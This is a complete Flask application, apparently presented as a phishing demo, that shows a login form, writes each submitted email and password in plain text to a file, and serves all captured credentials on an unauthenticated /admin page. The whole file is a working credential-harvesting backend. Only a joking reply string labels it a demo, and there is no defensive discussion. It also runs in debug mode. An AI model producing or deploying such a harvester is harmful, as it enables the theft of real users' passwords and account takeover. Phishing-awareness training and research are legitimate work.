from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        with open('captured_data.txt', 'a') as f:
            f.write(f"Email: {email}, Password: {password}\n")
        return "Thanks! You've been 'phished' for demo purposes 😄"
    return render_template('login.html')

@app.route('/admin')
def admin():
    try:
        with open('captured_data.txt', 'r') as f:
            data = f.readlines()
    except FileNotFoundError:
        data = []
    return "<h2>Captured Credentials</h2>" + "<br>".join(data)

if __name__ == '__main__':
    app.run(debug=True)
